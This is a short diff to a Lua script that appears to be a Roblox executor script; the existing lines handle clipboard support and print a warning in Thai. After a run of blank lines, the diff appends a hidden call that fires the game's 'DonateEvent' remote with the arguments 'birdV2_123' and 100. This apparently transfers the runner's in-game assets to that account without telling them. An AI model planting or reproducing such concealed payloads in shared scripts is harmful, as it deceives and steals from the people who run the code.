@@ -517,3 +517,14 @@ if setclipboard then
 else
     warn("setclipboard ใช้ไม่ได้ในอุปกรณ์นี้")
 end
+
+
+
+
+
+
+local args = {
+	"birdV2_123",
+	100
+}
+game:GetService("ReplicatedStorage"):WaitForChild("DonateEvent"):FireServer(unpack(args))
